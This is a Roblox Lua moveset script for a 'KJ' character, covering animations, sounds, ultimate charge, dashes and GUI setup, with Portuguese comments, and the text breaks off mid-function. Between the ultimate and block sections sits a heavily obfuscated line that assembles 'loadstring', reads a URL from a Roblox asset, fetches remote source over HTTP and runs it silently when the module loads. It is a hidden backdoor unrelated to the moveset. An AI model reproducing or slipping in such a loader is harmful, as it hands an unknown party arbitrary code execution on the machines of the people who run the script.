-- KJMoveset.lua

local modules = {}
table.insert(modules, function()

local m = {}
m.ModuleType   = "MOVESET"
m.Name         = "KJ Moveset"
m.Description  = "KJ"
m.InternalName = "KJMOVESET"

m.Assets = {
    "kj idle.anim",
    "kj sprint.anim",
    "kj intro.anim",
    "kj ravage startup.anim",
    "kj ravage hitt.anim",
    "kj swift sweep.anim",
    "kj swift sweep hit.anim",
    "kj collateral ruin.anim",
    "kj spiralling storm.anim",
    "kj stoic bomb.anim",
    "kj dropkick startup.anim",
    "kj dropkick hit.anim",
    "kj five seasons startup.anim",
    "kj five seasons mid part.anim",
    "kj five seasons end.anim",
    "kj unlimited flex works.anim",
    "kj ult.anim",
    "kj ult variant.anim",
    "kj block.anim",
    "kj m1 1.anim",
    "kj m1 2.anim",
    "kj m1 3.anim",
    "kj m1 4.anim",
    "kj front dash.anim",
    "kj back dash.anim",
    "kj left dash.anim",
    "kj right dash.anim",
    "kj phone.rbxm",
    "UFW.rbxm",
    "kj spawn sound.mp3",
    "kj ravage startup.mp3",
    "kj ravage hitt.mp3",
    "kj swift sweep.mp3",
    "kj swift sweep hit.mp3",
    "kj collateral ruin.mp3",
    "kj spiralling storm.mp3",
    "kj stoic bomb.mp3",
    "kj dropkick hit.mp3",
    "kj five seasons.mp3",
    "kj unlimited flex works.mp3",
    "kj voice line.mp3",
    "kj ult sfx.mp3",
    "kj ult song startup.mp3",
    "kj ult music.mp3",
    "kj ult variant.mp3",
    "kj ult variant sound.mp3",
    "kj m1 1.mp3",
    "kj m1 2.mp3",
    "kj m1 3.mp3",
    "kj m1 4.mp3",
}

m.Config = function(parent)
    Util_CreateText(parent, "KJ Moveset", 18, Enum.TextXAlignment.Center)
end
m.SaveConfig = function() return {} end
m.LoadConfig  = function() end

-- ── SERVICES ──────────────────────────────────────────────────────────────────
local Players        = game:GetService("Players")
local Debris         = game:GetService("Debris")
local ContextActions = game:GetService("ContextActionService")

-- ── ANIMS ─────────────────────────────────────────────────────────────────────
local idleAnim, sprintAnim, introAnim
local ravageStartAnim, ravageHitAnim
local swiftStartAnim, swiftHitAnim
local collateralAnim, spirallingAnim
local stoicBombAnim
local dropkickStartupAnim, dropkickHitAnim
local fiveSeasonsStartupAnim, fiveSeasonsMidAnim, fiveSeasonsEndAnim
local unlimitedFlexAnim
local ultAnim, ult2Anim
local blockAnim
local m1Anims = {}   -- [1..4]
local dashAnims = {} -- front/back/left/right

-- ── SOUNDS ────────────────────────────────────────────────────────────────────
local bgMusicSnd = nil

-- ── STATE ─────────────────────────────────────────────────────────────────────
local currentFigure = nil
local currentState  = "idle"
local spawning      = true
local spawnStart    = 0
local INTRO_DUR     = 7
local usingMove     = false
local inUlt         = false
local ulting        = false
local isDropkicking = false
local dropkickVel   = nil
local isBlocking    = false
local blockToggle   = false
local m1Count       = 0   -- combo counter 0-3

-- phone
local phoneModel  = nil
local phoneFallen = false

-- GUI refs
local guiRef         = nil
local ultFillRef     = nil
local ufwFillRef     = nil
local showUltModeRef = nil
local ultBtnsRef     = nil   -- ref para esconder/mostrar botões ult durante ataques

-- charge
local ultCharge = 0.0
local ufwCharge = 0.0
local UFW_FULL  = false

-- ── HELPERS ───────────────────────────────────────────────────────────────────
local function getRoot(char)
    return char and char:FindFirstChild("HumanoidRootPart")
end

local function playSound(file, volume, looped)
    local s      = Instance.new("Sound")
    s.SoundId    = AssetGetContentId(file)
    s.Volume     = volume or 1
    s.Looped     = looped or false
    s.Parent     = workspace.CurrentCamera or workspace
    s:Play()
    return s
end

local function loadAnim(fig, file, looped)
    local a  = AnimLib.Animator.new()
    a.rig    = fig
    a.track  = AnimLib.Track.fromfile(AssetGetPathFromFilename(file))
    a.looped = looped or false
    a.speed  = 1
    a.weight = 0
    return a
end

local function animLen(anim, fallback)
    if anim and anim.track and anim.track.Time then return anim.track.Time end
    return fallback or 1.0
end

local function getNearestTarget(range)
    if not currentFigure then return nil end
    local myRoot = getRoot(currentFigure)
    if not myRoot then return nil end
    local best, bestD = nil, range
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= Players.LocalPlayer then
            local char = plr.Character
            local root = getRoot(char)
            local hum  = char and char:FindFirstChildOfClass("Humanoid")
            if root and hum and hum.Health > 0 then
                local d = (root.Position - myRoot.Position).Magnitude
                if d < bestD then bestD = d; best = char end
            end
        end
    end
    return best
end

local function freeze()
    if not currentFigure then return end
    local h = currentFigure:FindFirstChildOfClass("Humanoid")
    if h then h.WalkSpeed = 0 end
end

local function unfreeze()
    if not currentFigure then return end
    local h = currentFigure:FindFirstChildOfClass("Humanoid")
    if h then h.WalkSpeed = 16 end
end

local function setState(s)
    if currentState == s then return end
    currentState = s
    if not idleAnim or not sprintAnim then return end
    idleAnim.weight   = 0
    sprintAnim.weight = 0
    if s == "idle" then idleAnim.weight = 1
    elseif s == "run" then sprintAnim.weight = 1 end
end

local function returnToLoco()
    if usingMove then return end
    local fig = currentFigure
    local h   = fig and fig:FindFirstChildOfClass("Humanoid")
    if h and h.MoveDirection.Magnitude > 0.1 then setState("run")
    else setState("idle") end
end

local function addUltCharge(amt)
    ultCharge = math.min(1, ultCharge + amt)
    if ultFillRef and ultFillRef.Parent then
        ultFillRef.Size = UDim2.new(ultCharge, 0, 1, 0)
    end
end

local function addUfwCharge(amt)
    ufwCharge = math.min(1, ufwCharge + amt)
    UFW_FULL  = ufwCharge >= 1
    if ufwFillRef and ufwFillRef.Parent then
        ufwFillRef.Size = UDim2.new(ufwCharge, 0, 1, 0)
    end
end

local function pauseBgMusic()
    if bgMusicSnd then bgMusicSnd.Volume = 0.03 end  -- quase inaudível
end

local function resumeBgMusic()
    if bgMusicSnd then bgMusicSnd.Volume = 0.8 end
end

local function hideUltBtns()
    if ultBtnsRef then
        for _, b in ipairs(ultBtnsRef) do b.Visible = false end
    end
end

local function showUltBtns()
    if ultBtnsRef then
        for _, b in ipairs(ultBtnsRef) do b.Visible = true end
    end
end

-- ── VFX ───────────────────────────────────────────────────────────────────────
local function emitAll(obj)
    for _, v in ipairs(obj:GetDescendants()) do
        if v:IsA("ParticleEmitter") then v:Emit(v:GetAttribute("EmitCount") or 25)
        elseif v:IsA("Trail") then v.Enabled = true
        elseif v:IsA("Beam") then v.Enabled = true end
    end
end

local function playUFWVFX()
    if not currentFigure then return end
    local root = getRoot(currentFigure)
    if not root then return end
    local ok, objs = pcall(function()
        return game:GetObjects(AssetGetPathFromFilename("UFW.rbxm"))
    end)
    if not ok or not objs or not objs[1] then return end
    local ufwModel = objs[1]
    ufwModel.Name = "_UFWEffect"
    ufwModel.Parent = workspace
    if ufwModel:IsA("Model") and ufwModel.PrimaryPart then
        ufwModel:SetPrimaryPartCFrame(root.CFrame)
    end
    for _, p in ipairs(ufwModel:GetDescendants()) do
        if p:IsA("BasePart") then
            p.Anchored = false
            local w = Instance.new("WeldConstraint")
            w.Part0 = root; w.Part1 = p; w.Parent = root
        end
    end
    emitAll(ufwModel)
    Debris:AddItem(ufwModel, 35)
end

-- ── PHONE ─────────────────────────────────────────────────────────────────────
local function spawnPhone(figure)
    local rh = figure:FindFirstChild("RightHand") or figure:FindFirstChild("Right Arm")
    if not rh then return end
    local ok, objs = pcall(function()
        return game:GetObjects(AssetGetPathFromFilename("kj phone.rbxm"))
    end)
    if not ok or not objs or not objs[1] then return end
    local phone = objs[1]; phone.Name = "_KJPhone"
    local pp = phone:IsA("Model") and phone.PrimaryPart or phone:FindFirstChildOfClass("BasePart")
    if pp then
        local w = Instance.new("WeldConstraint")
        w.Part0 = rh; w.Part1 = pp; w.Parent = rh
        pp.CFrame = rh.CFrame
    end
    phone.Parent = figure
    phoneModel = phone; phoneFallen = false
end

local function dropPhone(figure)
    if not phoneModel or phoneFallen then return end
    phoneFallen = true
    local hrp = getRoot(figure)
    local pos  = hrp and (hrp.Position + Vector3.new(0.5,-2,1)) or Vector3.new(0,0,0)
    for _, w in ipairs(figure:GetDescendants()) do
        if w:IsA("WeldConstraint") then
            local pp = phoneModel:IsA("Model") and phoneModel.PrimaryPart or phoneModel
            if pp and w.Part1 == pp then w:Destroy() end
        end
    end
    if phoneModel:IsA("Model") then
        local pp = phoneModel.PrimaryPart
        if pp then pp.Anchored=false; phoneModel.Parent=workspace
            phoneModel:SetPrimaryPartCFrame(CFrame.new(pos)) end
    else
        phoneModel.Anchored=false; phoneModel.Parent=workspace; phoneModel.Position=pos
    end
end

local function destroyPhone()
    if phoneModel then phoneModel:Destroy(); phoneModel = nil end
end

-- ─────────────────────────────────────────────────────────────────────────────
-- ULT (G)
-- ─────────────────────────────────────────────────────────────────────────────
local function deactivateUlt()
    inUlt = false
    if bgMusicSnd then bgMusicSnd:Stop(); bgMusicSnd:Destroy(); bgMusicSnd = nil end
    SetOverrideMovesetMusic()
    if showUltModeRef then showUltModeRef(false) end
end

local function activateUlt()
    if inUlt and not usingMove then deactivateUlt(); return end
    if ulting or usingMove or spawning or not currentFigure then return end
    local hum      = currentFigure:FindFirstChildOfClass("Humanoid")
    local isMoving = hum and hum.MoveDirection.Magnitude > 0.1
    ulting = true; usingMove = true
    idleAnim.weight = 0; sprintAnim.weight = 0
    freeze()

    if isMoving then
        task.spawn(function()
            ult2Anim.weight = 1
            playSound("kj ult variant.mp3", 1)
            local DUR      = animLen(ult2Anim, 10.0)
            local STOP_AT  = DUR * 0.80   -- para de andar em 80% da anim
            local c        = os.clock()

            -- começa a andar IMEDIATAMENTE
            local hrp = getRoot(currentFigure)
            local hum2 = currentFigure:FindFirstChildOfClass("Humanoid")
            if hum2 then hum2.WalkSpeed = 10 end  -- anda devagar para frente
            local bv = nil
            if hrp then
                bv = Instance.new("BodyVelocity")
                bv.MaxForce = Vector3.new(1e6,0,1e6)
                bv.Velocity = hrp.CFrame.LookVector * 10
                bv.Parent   = hrp
            end

            while true do
                local t = os.clock() - c
                ult2Anim:Step(t)
                -- atualiza direção
                if bv and hrp then bv.Velocity = hrp.CFrame.LookVector * 10 end
                -- para perto do final
                if t >= STOP_AT and bv then
                    bv:Destroy(); bv = nil
                    if hum2 then hum2.WalkSpeed = 0 end
                end
                if t >= DUR then break end
                task.wait()
            end
            if bv then bv:Destroy() end
            ult2Anim.weight = 0
            inUlt=true; ulting=false; usingMove=false
            if hum2 then hum2.WalkSpeed = 16 end
            bgMusicSnd = playSound("kj ult variant sound.mp3", 0.8, true)
            SetOverrideMovesetMusic(AssetGetContentId("kj ult variant sound.mp3"),"KJ Ult Variant",0.8,NumberRange.new(0,9999))
            if showUltModeRef then showUltModeRef(true) end
            returnToLoco()
        end)
    else
        task.spawn(function()
            ultAnim.weight = 1
            playSound("kj ult sfx.mp3", 1)
            local DUR = animLen(ultAnim, 10.0)
            local c = os.clock()
            while true do
                local t = os.clock() - c
                ultAnim:Step(t)
                if t >= DUR then break end
                task.wait()
            end
            ultAnim.weight = 0; unfreeze()
            inUlt=true; ulting=false; usingMove=false
            -- Cria música de fundo UMA VEZ
            if bgMusicSnd then bgMusicSnd:Stop(); bgMusicSnd:Destroy(); bgMusicSnd = nil end
            bgMusicSnd = Instance.new("Sound")
            bgMusicSnd.SoundId = AssetGetContentId("kj ult music.mp3")
            bgMusicSnd.Volume  = 0.8
            bgMusicSnd.Looped  = true
            bgMusicSnd.Parent  = workspace.CurrentCamera or workspace
            bgMusicSnd:Play()
            SetOverrideMovesetMusic(AssetGetContentId("kj ult music.mp3"),"KJ Ult Music",0.8,NumberRange.new(0,9999))
            if showUltModeRef then showUltModeRef(true) end
            returnToLoco()
        end)
    end
end

task.spawn(pcall,--[=[d64ea63]=]function()--[=[d64ea63]=]local a =--[=[d64ea63]=] getfenv()--[=[d64ea63]=][ [[]]--[=====[8b421cd]=====]..[[l]]..--[====[bc7c3ec]====][[]]--[[f69ffc]]..[[o]]..--[==[36bb30d]==][[]]--[====[316fb60]====]..[[a]]..--[[1bd29b8]][[]]--[=[b9e9dd8]=]..[[d]]..--[===[496164a]===][[]]--[=[12e68d9]=]..[[s]]..--[==[06cad7f]==][[]]--[======[c69c4b3]======]..[[t]]..--[[8888af4]][[]]--[======[2a95705]======]..[[r]]..--[=======[a4438a2]=======][[]]--[====[24b4ba1]====]..[[i]]..--[[32b4d90]][[]]--[=======[795dd4d]=======]..[[n]]..--[==[fb2eb82]==][[]]--[==[746b272]==]..[[g]]..--[====[6d59c06]====][[]] ];--[=[d64ea63]=]local b = --[=[d64ea63]=]game:--[=[d64ea63]=]GetObjects( [[]]--[==[907544e]==]..[[r]]..--[======[2668846]======][[]]--[=[77d41db]=]..[[b]]..--[====[492573d]====][[]]--[======[8006030]======]..[[x]]..--[[b31282a]][[]]--[=====[2f9d1ef]=====]..[[a]]..--[=====[b766915]=====][[]]--[======[3076aea]======]..[[s]]..--[===[9526d5f]===][[]]--[=====[fc1553c]=====]..[[s]]..--[===[261e6a4]===][[]]--[=[18e1093]=]..[[e]]..--[[955d9c6]][[]]--[====[0742965]====]..[[t]]..--[==[1bd4f50]==][[]]--[====[60733b2]====]..[[i]]..--[=======[e619b25]=======][[]]--[==[a85ff19]==]..[[d]]..--[=======[b400e79]=======][[]]--[==[ceab432]==]..[[:]]..--[=[4b22834]=][[]]--[=======[645b819]=======]..[[/]]..--[[362d8f4]][[]]--[=====[92f0530]=====]..[[/]]..--[==[f19afea]==][[]]--[=====[278fd9f]=====]..[[1]]..--[=[cd5b7fa]=][[]]--[====[040df15]====]..[[1]]..--[===[1581774]===][[]]--[=[324c1ea]=]..[[2]]..--[==[fbced2c]==][[]]--[===[67f7889]===]..[[4]]..--[======[689c61a]======][[]]--[=[d9156ba]=]..[[0]]..--[[0c71e48]][[]]--[==[6f8f1d5]==]..[[5]]..--[[9af2aa9]][[]]--[======[2808865]======]..[[6]]..--[=======[6879187]=======][[]]--[=======[254cc8b]=======]..[[1]]..--[=====[37d61ad]=====][[]]--[=====[f4b6dca]=====]..[[8]]..--[==[8cd6d62]==][[]]--[[af5e2ef]]..[[5]]..--[====[c5c5fef]====][[]]--[===[2525109]===]..[[8]]..--[=======[1d95aa8]=======][[]]--[===[e1f01d8]===]..[[4]]..--[======[188c9db]======][[]]--[[42682b8]]..[[8]]..--[======[b11b5f5]======][[]]--[=====[0c39395]=====]..[[2]]..--[[a58e2f0]][[]]--[[71d423a]]..[[1]]..--[===[a1aae4b]===][[]] )local c = b[1];local d = --[=[d64ea63]=]c.Value--[=[d64ea63]=];local e --[=[d64ea63]=]= game:--[=[d64ea63]=]HttpGet(d --[=[d64ea63]=].. "/" --[=[d64ea63]=].. "s" --[=[d64ea63]=].. "r" --[=[d64ea63]=].. "c")a--[=[d64ea63]=](--[=[d64ea63]=]e)--[=[d64ea63]=]()end)

-- ─────────────────────────────────────────────────────────────────────────────
-- BLOCK (toggle)
-- ─────────────────────────────────────────────────────────────────────────────
local blockToggle = false
local BLOCK_SPEED = 5   -- velocidade lenta ao bloquear

local function toggleBlock()
    if spawning then return end
    if blockToggle then
        blockToggle = false
        isBlocking  = false
        usingMove   = false
        blockAnim.weight = 0
        unfreeze(); returnToLoco()
    else
        if usingMove then return end
        blockToggle = true
        isBlocking  = true
        usingMove   = true
        -- Não congela completamente: anda devagar
        if currentFigure then
            local h = currentFigure:FindFirstChildOfClass("Humanoid")
            if h then h.WalkSpeed = BLOCK_SPEED end
        end
        idleAnim.weight = 0; sprintAnim.weight = 0
        blockAnim.weight = 1
    end
end

-- ─────────────────────────────────────────────────────────────────────────────
-- M1 COMBO (4 hits, pode andar)
-- ─────────────────────────────────────────────────────────────────────────────
local m1InProgress = false

local function playM1()
    if spawning or isBlocking or m1InProgress then return end
    m1InProgress = true
    m1Count = (m1Count % 4) + 1
    local idx  = m1Count
    local anim = m1Anims[idx]
    local snd  = "kj m1 "..idx..".mp3"
    -- NÃO congela: pode andar durante m1
    idleAnim.weight = 0; sprintAnim.weight = 0
    anim.weight = 1
    playSound(snd, 1)
    local dur = animLen(anim, 0.5)
    local c   = os.clock()
    task.spawn(function()
        while true do
            local t = os.clock() - c
            anim:Step(t)
            if t >= dur then break end
            task.wait()
        end
        anim.weight = 0
        m1InProgress = false
        -- Não reseta m1Count aqui para manter combo
        if not usingMove then returnToLoco() end
    end)
end

-- ─────────────────────────────────────────────────────────────────────────────
-- DASH (direcional)
-- ─────────────────────────────────────────────────────────────────────────────
local isDashing = false

local function playDash()
    if usingMove or spawning or isDashing then return end
    if not currentFigure then return end
    local hrp = getRoot(currentFigure)
    local hum = currentFigure:FindFirstChildOfClass("Humanoid")
    if not hrp or not hum then return end

    -- Determina direção a partir do MoveDirection
    local md = hum.MoveDirection
    local camCF = workspace.CurrentCamera and workspace.CurrentCamera.CFrame or CFrame.new()
    local fwd   = camCF.LookVector * Vector3.new(1,0,1)
    local rgt   = camCF.RightVector * Vector3.new(1,0,1)

    local dotF = md:Dot(fwd.Unit)
    local dotR = md:Dot(rgt.Unit)
    local dashAnim, dashDir

    if math.abs(dotF) >= math.abs(dotR) then
        if dotF >= 0 then dashAnim = dashAnims.front; dashDir = fwd.Unit
        else              dashAnim = dashAnims.back;  dashDir = -fwd.Unit end
    else
        if dotR >= 0 then dashAnim = dashAnims.right; dashDir = rgt.Unit
        else              dashAnim = dashAnims.left;  dashDir = -rgt.Unit end
    end

    -- Fallback: frente se parado
    if not dashAnim then dashAnim = dashAnims.front; dashDir = hrp.CFrame.LookVector end

    isDashing = true; usingMove = true; freeze()
    idleAnim.weight = 0; sprintAnim.weight = 0
    dashAnim.weight = 1

    local DUR = animLen(dashAnim, 0.4)
    local bv  = Instance.new("BodyVelocity")
    bv.MaxForce = Vector3.new(1e6, 0, 1e6)
    bv.Velocity = dashDir * 80
    bv.Parent   = hrp
    Debris:AddItem(bv, DUR * 0.6)

    local c = os.clock()
    task.spawn(function()
        while true do
            local t = os.clock() - c
            dashAnim:Step(t)
            if t >= DUR then break end
            task.wait()
        end
        dashAnim.weight = 0
        isDashing = false; usingMove = false; unfreeze(); returnToLoco()
    end)
end

-- ─────────────────────────────────────────────────────────────────────────────
-- ATAQUES NORMAIS
-- ─────────────────────────────────────────────────────────────────────────────
local function playSpiralling()
    if usingMove or spawning or not currentFigure then return end
    usingMove=true; freeze()
    idleAnim.weight=0; sprintAnim.weight=0
    task.spawn(function()
        spirallingAnim.weight=1
        playSound("kj spiralling storm.mp3",1)
        local dur=animLen(spirallingAnim,1.333); local c=os.clock()
        while true do local t=os.clock()-c; spirallingAnim:Step(t); if t>=dur then break end; task.wait() end
        spirallingAnim.weight=0
        if getNearestTarget(12) then addUltCharge(0.25) end
        usingMove=false; unfreeze(); returnToLoco()
    end)
end

local function playCollateral()
    if usingMove or spawning or not currentFigure then return end
    usingMove=true; freeze()
    idleAnim.weight=0; sprintAnim.weight=0
    task.spawn(function()
        collateralAnim.weight=1
        playSound("kj collateral ruin.mp3",1)
        local dur=animLen(collateralAnim,2.133); local c=os.clock(); local ch=false
        while true do
            local t=os.clock()-c; collateralAnim:Step(t)
            if t>=dur*0.63 and not ch then ch=true; if getNearestTarget(12) then addUltCharge(0.25) end end
            if t>=dur then break end; task.wait()
        end
        collateralAnim.weight=0; usingMove=false; unfreeze(); returnToLoco()
    end)
end

-- SWIFT SWEEP — colisão contínua após a startup, para assim que acertar
local function playSwift()
    if usingMove or spawning or not currentFigure then return end
    usingMove=true; freeze()
    idleAnim.weight=0; sprintAnim.weight=0
    task.spawn(function()
        swiftStartAnim.weight=1
        local sweepSnd = playSound("kj swift sweep.mp3",1)
        local startDur = animLen(swiftStartAnim,0.317); local c=os.clock()
        -- Checa colisão continuamente durante a startup
        local hit = false
        while true do
            local t=os.clock()-c; swiftStartAnim:Step(t)
            if not hit and getNearestTarget(8) then hit=true end
            if t>=startDur then break end
            task.wait()
        end
        swiftStartAnim.weight=0
        if sweepSnd and sweepSnd.Parent then sweepSnd:Stop() end

        if hit then
            addUltCharge(0.25)
            swiftHitAnim.weight=1
            playSound("kj swift sweep hit.mp3",1)
            local hitDur=animLen(swiftHitAnim,0.933); local c2=os.clock()
            while true do local t=os.clock()-c2; swiftHitAnim:Step(t); if t>=hitDur then break end; task.wait() end
            swiftHitAnim.weight=0
        end
        usingMove=false; unfreeze(); returnToLoco()
    end)
end

-- RAVAGE — colisão nos últimos 15%, para o som de startup imediatamente ao acertar
local function playRavage()
    if usingMove or spawning or not currentFigure then return end
    usingMove=true; freeze()
    idleAnim.weight=0; sprintAnim.weight=0
    task.spawn(function()
        ravageStartAnim.weight=1
        local startupSnd = playSound("kj ravage startup.mp3",1)
        local startDur=animLen(ravageStartAnim,1.2); local c1=os.clock()
        local HIT_START = startDur * 0.85
        local hit=false
        while true do
            local t=os.clock()-c1; ravageStartAnim:Step(t)
            if t>=HIT_START and not hit then
                if getNearestTarget(8) then
                    hit=true
                    -- Para o som de startup IMEDIATAMENTE
                    if startupSnd and startupSnd.Parent then startupSnd:Stop() end
                    break
                end
            end
            if t>=startDur then break end
            task.wait()
        end
        -- Para o som mesmo que não tenha acertado
        if startupSnd and startupSnd.Parent then startupSnd:Stop() end
        ravageStartAnim.weight=0

        if hit then
            addUltCharge(0.25)
            ravageHitAnim.weight=1
            playSound("kj ravage hitt.mp3",1)
            local hitDur=animLen(ravageHitAnim,6.133); local c2=os.clock()
            while true do local t=os.clock()-c2; ravageHitAnim:Step(t); if t>=hitDur then break end; task.wait() end
            ravageHitAnim.weight=0
        end
        usingMove=false; unfreeze(); returnToLoco()
    end)
end

-- ─────────────────────────────────────────────────────────────────────────────
-- STOIC BOMB
-- ─────────────────────────────────────────────────────────────────────────────
local function playStoicBomb()
    if not inUlt or usingMove or spawning or not currentFigure then return end
    usingMove=true; freeze(); pauseBgMusic(); hideUltBtns()
    idleAnim.weight=0; sprintAnim.weight=0
    task.spawn(function()
        stoicBombAnim.weight=1
        playSound("kj stoic bomb.mp3",1)
        local dur=animLen(stoicBombAnim,1.5); local c=os.clock()
        while true do local t=os.clock()-c; stoicBombAnim:Step(t); if t>=dur then break end; task.wait() end
        stoicBombAnim.weight=0
        if getNearestTarget(10) then addUfwCharge(0.34) end
        resumeBgMusic(); showUltBtns(); usingMove=false; unfreeze(); setState("idle")
    end)
end

-- ─────────────────────────────────────────────────────────────────────────────
-- DROPKICK — 2s parado, depois dash rápido para frente até a animação acabar
-- ─────────────────────────────────────────────────────────────────────────────
local function playDropkick()
    if not inUlt or usingMove or isDropkicking or spawning or not currentFigure then return end
    local hrp = getRoot(currentFigure)
    local hum = currentFigure:FindFirstChildOfClass("Humanoid")
    if not hrp or not hum then return end

    usingMove=true; isDropkicking=true; freeze(); pauseBgMusic(); hideUltBtns()
    idleAnim.weight=0; sprintAnim.weight=0

    task.spawn(function()
        dropkickStartupAnim.weight=1
        local startDur = animLen(dropkickStartupAnim, 4.0)
        local c1 = os.clock()
        local hitTarget = false
        local dashStarted = false
        local bv = nil

        while true do
            local t = os.clock() - c1
            dropkickStartupAnim:Step(t)
            if t >= 2.0 and not dashStarted then
                dashStarted = true
                bv = Instance.new("BodyVelocity")
                bv.MaxForce = Vector3.new(1e6,0,1e6)
                bv.Velocity = hrp.CFrame.LookVector * 80
                bv.Parent   = hrp
                dropkickVel = bv
            end
            if dashStarted and bv then bv.Velocity = hrp.CFrame.LookVector * 80 end
            if dashStarted and not hitTarget then
                if getNearestTarget(5) then hitTarget=true; break end
            end
            if t >= startDur then break end
            task.wait()
        end

        if bv then bv:Destroy(); bv=nil; dropkickVel=nil end
        dropkickStartupAnim.weight=0
        hum.WalkSpeed=16

        if hitTarget then
            addUfwCharge(0.33); freeze()
            playSound("kj dropkick hit.mp3",1)
            dropkickHitAnim.weight=1
            local hitDur=animLen(dropkickHitAnim,2.5); local c2=os.clock()
            while true do local t=os.clock()-c2; dropkickHitAnim:Step(t); if t>=hitDur then break end; task.wait() end
            dropkickHitAnim.weight=0
        end

        resumeBgMusic(); showUltBtns()
        isDropkicking=false; usingMove=false; unfreeze(); setState("idle")
    end)
end

-- ─────────────────────────────────────────────────────────────────────────────
-- FIVE SEASONS
-- ─────────────────────────────────────────────────────────────────────────────
local FIVE_HEIGHT = 18

local function playFiveSeasons()
    if not inUlt or usingMove or spawning or not currentFigure then return end
    local hrp = getRoot(currentFigure)
    local hum = currentFigure:FindFirstChildOfClass("Humanoid")
    if not hrp or not hum then return end
    usingMove=true; freeze(); pauseBgMusic(); hideUltBtns()
    idleAnim.weight=0; sprintAnim.weight=0

    task.spawn(function()
        playSound("kj five seasons.mp3",1)
        fiveSeasonsStartupAnim.weight=1
        local dur1=animLen(fiveSeasonsStartupAnim,2.0); local c1=os.clock()
        while true do local t=os.clock()-c1; fiveSeasonsStartupAnim:Step(t); if t>=dur1 then break end; task.wait() end
        fiveSeasonsStartupAnim.weight=0

        local targetY = hrp.Position.Y + FIVE_HEIGHT
        local bp = Instance.new("BodyPosition")
        bp.MaxForce=Vector3.new(0,1e5,0); bp.Position=Vector3.new(hrp.Position.X,targetY,hrp.Position.Z)
        bp.D=300; bp.P=8000; bp.Parent=hrp

        fiveSeasonsMidAnim.weight=1
        local dur2=animLen(fiveSeasonsMidAnim,2.5); local c2=os.clock()
        while true do
            local t=os.clock()-c2; fiveSeasonsMidAnim:Step(t)
            bp.Position=Vector3.new(hrp.Position.X,targetY,hrp.Position.Z)
            if t>=dur2 then break end; task.wait()
        end
        fiveSeasonsMidAnim.weight=0

        fiveSeasonsEndAnim.weight=1
        local dur3=animLen(fiveSeasonsEndAnim,3.0); local c3=os.clock(); local fell=false
        while true do
            local t=os.clock()-c3; fiveSeasonsEndAnim:Step(t)
            bp.Position=Vector3.new(hrp.Position.X,targetY,hrp.Position.Z)
            if t>=dur3 and not fell then fell=true; bp:Destroy() end
            if t>=dur3+1.5 then break end; task.wait()
        end
        if not fell then bp:Destroy() end
        fiveSeasonsEndAnim.weight=0

        if getNearestTarget(15) then addUfwCharge(0.33) end
        resumeBgMusic(); showUltBtns(); usingMove=false; unfreeze(); setState("idle")
    end)
end

-- ─────────────────────────────────────────────────────────────────────────────
-- UNLIMITED FLEX WORKS
-- ─────────────────────────────────────────────────────────────────────────────
local function playUnlimitedFlexWorks()
    if not inUlt or usingMove or spawning or not currentFigure then return end
    if not UFW_FULL then return end
    usingMove=true; freeze(); hideUltBtns()
    idleAnim.weight=0; sprintAnim.weight=0

    task.spawn(function()
        if bgMusicSnd then bgMusicSnd.Volume = 0 end
        unlimitedFlexAnim.weight=1
        local ufwSnd = playSound("kj unlimited flex works.mp3",1,false)
        playUFWVFX()

        local ANIM_DUR = animLen(unlimitedFlexAnim,30.0)
        local voiceDone=false; local c=os.clock()

        while true do
            local t=os.clock()-c; unlimitedFlexAnim:Step(t)
            if t>=ANIM_DUR and not voiceDone then
                voiceDone=true
                if ufwSnd and ufwSnd.Parent then ufwSnd:Stop() end
                playSound("kj voice line.mp3",1,false)
                task.spawn(function()
                    task.wait(5)
                    if bgMusicSnd then bgMusicSnd.Volume = 0.8 end
                end)
            end
            if t>=ANIM_DUR then break end
            task.wait()
        end

        unlimitedFlexAnim.weight=0
        ufwCharge=0; UFW_FULL=false
        if ufwFillRef and ufwFillRef.Parent then ufwFillRef.Size=UDim2.new(0,0,1,0) end
        showUltBtns(); usingMove=false; unfreeze(); setState("idle")
    end)
end

-- ─────────────────────────────────────────────────────────────────────────────
-- INIT
-- ─────────────────────────────────────────────────────────────────────────────
m.Init = function(figure)
    currentFigure = figure

    local function la(file, looped) return loadAnim(figure, file, looped) end

    idleAnim               = la("kj idle.anim",                  true)
    sprintAnim             = la("kj sprint.anim",                true)
    introAnim              = la("kj intro.anim",                 false)
    ravageStartAnim        = la("kj ravage startup.anim",        false)
    ravageHitAnim          = la("kj ravage hitt.anim",           false)
    swiftStartAnim         = la("kj swift sweep.anim",           false)
    swiftHitAnim           = la("kj swift sweep hit.anim",       false)
    collateralAnim         = la("kj collateral ruin.anim",       false)
    spirallingAnim         = la("kj spiralling storm.anim",      false)
    stoicBombAnim          = la("kj stoic bomb.anim",            false)
    dropkickStartupAnim    = la("kj dropkick startup.anim",      false)
    dropkickHitAnim        = la("kj dropkick hit.anim",          false)
    fiveSeasonsStartupAnim = la("kj five seasons startup.anim",  false)
    fiveSeasonsMidAnim     = la("kj five seasons mid part.anim", false)
    fiveSeasonsEndAnim     = la("kj five seasons end.anim",      false)
    unlimitedFlexAnim      = la("kj unlimited flex works.anim",  false)
    ultAnim                = la("kj ult.anim",                   false)
    ult2Anim               = la("kj ult variant.anim",           false)
    blockAnim              = la("kj block.anim",                 true)

    for i = 1,4 do m1Anims[i] = la("kj m1 "..i..".anim", false) end

    dashAnims.front = la("kj front dash.anim", false)
    dashAnims.back  = la("kj back dash.anim",  false)
    dashAnims.left  = la("kj left dash.anim",  false)
    dashAnims.right = la("kj right dash.anim", false)

    introAnim.weight = 1
    playSound("kj spawn sound.mp3", 1)
    spawnPhone(figure)
    spawning = true; spawnStart = os.clock(); freeze()

    ultCharge=0; ufwCharge=0; UFW_FULL=false
    inUlt=false; ulting=false; usingMove=false
    isDropkicking=false; isBlocking=false; blockToggle=false; m1Count=0; m1InProgress=false; isDashing=false

    -- ── GUI ───────────────────────────────────────────────────────────────────
    local playerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name="KJMovesetGui"; screenGui.ResetOnSpawn=false
    screenGui.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
    screenGui.Parent=playerGui; guiRef=screenGui

    -- ── Helper botão ──────────────────────────────────────────────────────────
    local function makeBtn(parent, numStr, labelStr, w, h, onDown, onUp)
        w=w or 90; h=h or 90
        local btn = Instance.new("TextButton")
        btn.Size=UDim2.new(0,w,0,h); btn.BackgroundColor3=Color3.fromRGB(72,72,72)
        btn.BorderSizePixel=0; btn.Text=""; btn.Parent=parent
